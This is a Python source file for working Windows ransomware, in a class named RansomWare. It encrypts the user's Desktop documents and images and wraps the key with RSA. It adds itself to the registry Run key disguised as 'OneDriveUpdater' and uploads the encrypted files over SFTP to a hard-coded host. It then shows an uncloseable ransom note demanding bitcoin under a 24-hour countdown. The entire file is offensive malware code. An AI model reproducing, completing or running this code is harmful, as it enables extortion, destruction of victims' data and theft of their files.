# Imports
from cryptography.fernet import Fernet
import os
import ctypes
import urllib.request
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from tkinter import *
import winreg
import psutil
from threading import Thread, Event
from time import sleep
import paramiko


class RansomWare:
    file_exts = ['txt', 'pdf', 'png', 'jpg']

    def __init__(self):
        self.key = None
        self.key_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'temporaryUpdater.txt')
        self.crypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = os.path.join(self.sysRoot,'Desktop')
        self.crypted_files = []
        self.ip = '192.168.159.139'
        self.write_complete_event = Event()
        self.read_complete_event =Event()
        self.log_path = f"{self.sysRoot}\\Documents\\log_file.txt"
 
    def connection(self):
        client = paramiko.SSHClient()    
        known_hosts_path = os.path.expanduser('~/.ssh/known_hosts')
        client.load_host_keys(known_hosts_path)
        try:
            client.connect(self.ip, port=22, username='admin', password='admin')
        except paramiko.SSHException as e:
           return

        try:
            ftp_conn = client.open_sftp()
            paths = self.read_log()
            for path in paths:
            # Il canale aperto non è strettamente necessario per l'upload SFTP, quindi può essere omesso.
                ftp_conn.put(path,os.path.basename(path))
        except Exception as e:
             return
        finally:
            ftp_conn.close()
            client.close()



    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        with open(self.key_path,'wb') as f:
            f.write(self.key)
            return 1

    def encrypt_fernet_key(self):
        public_key = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'OneDrive', 'public.pem')
        created = 0
        if not os.path.exists(self.key_path):
            created = self.write_key()
        with open(self.key_path, 'rb') as fk:
            fernet_key = fk.read()
        if created == 1:
            with open(self.key_path, 'wb') as f:
                self.public_key = RSA.import_key(open(public_key).read())
                public_crypter = PKCS1_OAEP.new(self.public_key)
                enc_fernent_key = public_crypter.encrypt(fernet_key)
                f.write(enc_fernent_key)
            self.key = enc_fernent_key
        else:
            self.key = fernet_key
        self.crypter = None

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)
        if not encrypted:
            new_path = file_path + ".encrypt"
            os.rename(file_path, new_path)
            self.crypted_files.append(new_path)
            return new_path
        
    def write_log(self):
        with open(self.log_path, 'w') as f:
            for file_path in self.crypted_files:
                f.write(f"{file_path}\n")
        self.write_complete_event.set()
    
    def read_log(self):
        paths = []
        self.write_complete_event.wait()
        with open(self.log_path, 'r') as f:
            for line in f:
                paths.append(line.strip())
        self.read_complete_event.set()
        return paths

                
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, _, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if file.split('.')[-1] not in self.file_exts:
                    continue
                self.crypt_file(file_path, encrypted=encrypted)
        self.write_log()

    def already_exists(self, key_type, key_path, key_name):
        try:
            key = winreg.OpenKey(key_type, key_path, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, key_name)
            winreg.CloseKey(key)
            return True
        except WindowsError:
            return False

    def set_high_priority(self):
        pid = os.getpid()
        p = psutil.Process(pid)
        p.nice(psutil.HIGH_PRIORITY_CLASS)

    def add_to_startup(self, file_path, key_name="OneDriveUpdater"):
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key_type = winreg.HKEY_CURRENT_USER
        key = winreg.OpenKey(key_type, key_path, 0, winreg.KEY_SET_VALUE)
        path = os.path.expandvars(file_path)
        value = f'{path}\\RansomWare.exe'
        if not self.already_exists(key_type, key_path, key_name):
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)
    
    def change_desktop_background(self):
        imageUrl = 'https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fgetwallpapers.com%2Fwallpaper%2Ffull%2F6%2F6%2Fc%2F266252.jpg&f=1&nofb=1&ipt=3f9154ef99c2da2759ffc5be46ba3698072b73b2bd6891ef1cbd7e5fa93eabb3&ipo=images'
        path = f'{self.sysRoot}\\AppData\\Local\\Temp\\72dks289d9dfd89wf.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def show_ransom_note(self):
        self.change_desktop_background()
        root = Tk()
        root.title("OOOOOPS...PAY ATTENTION")
        root.geometry("700x500")
        root.resizable(False, False)

        def disable_event():
            pass

        root.protocol("WM_DELETE_WINDOW", disable_event) 
        
        Tk_Width = 700
        Tk_Height = 500

    
        x_Left = int(root.winfo_screenwidth()/2 - Tk_Width/2)
        y_Top = int(root.winfo_screenheight()/2 - Tk_Height/2)
        
        root.geometry(f"+{x_Left}+{y_Top}")

        lb=Label(root,text="LAZARUS",font=("Segoe UI Black",24),bg="red",fg="white")
        message_lb=Label(root,text="Your Files Are Be Encrypted, for Decrypt It\n Send 1000BTC in this Adress Before 24 Hours : \n ThDY834SVZGJfsdabsozv52lzssz084Bcsvz",font=("Segoe UI Black",15))
        compteur_label=Label(root,font=("Segoe UI Black",60))


        root.attributes("-toolwindow", True)
        root.attributes("-topmost", True)

        def compteur(timing):
            time_var = timing.split(":")
            hour = int(time_var[0])
            minu = int(time_var[1])
            sec = int(time_var[2])
            compteur_label['text'] = "{}:{}:{}".format(hour, minu, sec)
            if sec > 0 or minu > 0 or hour > 0:
                if sec > 0:
                    sec -= 1
                elif minu > 0:
                    minu -= 1
                    sec = 59
                elif hour > 0:
                    hour -= 1
                    minu = 59
                    sec = 59
                root.after(1000, compteur, f"{hour:02}:{minu:02}:{sec:02}")

        root.columnconfigure(0, weight=1)
        root.rowconfigure([0, 1, 2], weight=1)

        lb.grid(row=0,column=0,padx=240)
        message_lb.grid(row=1, column=0, pady=10, sticky="n")
        compteur_label.grid(row=2, column=0, pady=20, sticky="n" )
        compteur("24:00:00")
        root.mainloop()


def main():
    rw = RansomWare()
    rw.generate_key()
    rw.add_to_startup(rw.localRoot)
    rw.crypt_system()
    rw.encrypt_fernet_key()
    rw.set_high_priority()

    t1 = Thread(target=rw.show_ransom_note)
    t2 = Thread(target=rw.connection)
    t1.start()
    t2.start()



if __name__ == '__main__':
    main()
